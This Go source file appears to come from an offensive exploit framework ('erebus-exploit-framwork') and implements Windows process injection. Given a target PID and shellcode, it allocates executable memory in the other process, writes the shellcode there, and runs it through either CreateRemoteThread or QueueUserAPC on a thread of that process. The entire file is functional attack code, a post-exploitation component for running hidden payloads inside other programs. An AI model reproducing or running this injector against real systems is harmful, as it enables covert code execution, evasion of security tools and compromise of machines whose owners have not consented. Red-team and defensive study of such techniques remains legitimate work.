//go:build windows

package tasks

import (
	"context"
	"fmt"
	"unsafe"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"golang.org/x/sys/windows"
)

const (
	memCommit             = 0x1000
	memReserve            = 0x2000
	pageExecuteReadWrite  = 0x40
)

var (
	kernel32                   = windows.NewLazyDLL("kernel32.dll")
	procVirtualAllocEx         = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory     = kernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread     = kernel32.NewProc("CreateRemoteThread")
	procQueueUserAPC           = kernel32.NewProc("QueueUserAPC")
	procVirtualProtectEx       = kernel32.NewProc("VirtualProtectEx")
)

func performInjection(_ context.Context, task *pb.InjectTask) (*pb.InjectResult, error) {
	if len(task.Shellcode) == 0 {
		return nil, fmt.Errorf("shellcode required")
	}

	method := task.Method
	if method == "" {
		method = "createremotethread"
	}

	switch method {
	case "createremotethread":
		return injectCreateRemoteThread(task)
	case "apcqueue":
		return injectAPCQueue(task)
	default:
		return nil, fmt.Errorf("unsupported injection method: %s", method)
	}
}

func injectCreateRemoteThread(task *pb.InjectTask) (*pb.InjectResult, error) {
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|
			windows.PROCESS_QUERY_INFORMATION,
		false, task.TargetPid,
	)
	if err != nil {
		return nil, fmt.Errorf("OpenProcess(%d): %w", task.TargetPid, err)
	}
	defer windows.CloseHandle(hProcess)

	// Allocate memory in target process
	addr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(task.Shellcode)),
		memCommit|memReserve,
		pageExecuteReadWrite,
	)
	if addr == 0 {
		return nil, fmt.Errorf("VirtualAllocEx: %w", err)
	}

	// Write shellcode
	var written uintptr
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		addr,
		uintptr(unsafe.Pointer(&task.Shellcode[0])),
		uintptr(len(task.Shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("WriteProcessMemory: %w", err)
	}

	// Create remote thread
	var threadID uint32
	hThread, _, err := procCreateRemoteThread.Call(
		uintptr(hProcess),
		0, 0,
		addr,
		0, 0,
		uintptr(unsafe.Pointer(&threadID)),
	)
	if hThread == 0 {
		return nil, fmt.Errorf("CreateRemoteThread: %w", err)
	}
	windows.CloseHandle(windows.Handle(hThread))

	return &pb.InjectResult{
		Success:   true,
		TargetPid: task.TargetPid,
		ThreadId:  threadID,
	}, nil
}

func injectAPCQueue(task *pb.InjectTask) (*pb.InjectResult, error) {
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ,
		false, task.TargetPid,
	)
	if err != nil {
		return nil, fmt.Errorf("OpenProcess(%d): %w", task.TargetPid, err)
	}
	defer windows.CloseHandle(hProcess)

	addr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(task.Shellcode)),
		memCommit|memReserve,
		pageExecuteReadWrite,
	)
	if addr == 0 {
		return nil, fmt.Errorf("VirtualAllocEx: %w", err)
	}

	var written uintptr
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		addr,
		uintptr(unsafe.Pointer(&task.Shellcode[0])),
		uintptr(len(task.Shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("WriteProcessMemory: %w", err)
	}

	// Enumerate threads and queue APC on first thread of target process
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return nil, fmt.Errorf("CreateToolhelp32Snapshot: %w", err)
	}
	defer windows.CloseHandle(snap)

	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))

	err = windows.Thread32First(snap, &te)
	if err != nil {
		return nil, fmt.Errorf("Thread32First: %w", err)
	}

	for {
		if te.OwnerProcessID == task.TargetPid {
			hThread, err := windows.OpenThread(
				windows.THREAD_SET_CONTEXT, false, te.ThreadID,
			)
			if err == nil {
				ret, _, err := procQueueUserAPC.Call(addr, uintptr(hThread), 0)
				windows.CloseHandle(hThread)
				if ret != 0 {
					return &pb.InjectResult{
						Success:   true,
						TargetPid: task.TargetPid,
						ThreadId:  te.ThreadID,
					}, nil
				}
				_ = err
			}
		}

		err = windows.Thread32Next(snap, &te)
		if err != nil {
			break
		}
	}

	return nil, fmt.Errorf("no suitable thread found for APC injection")
}
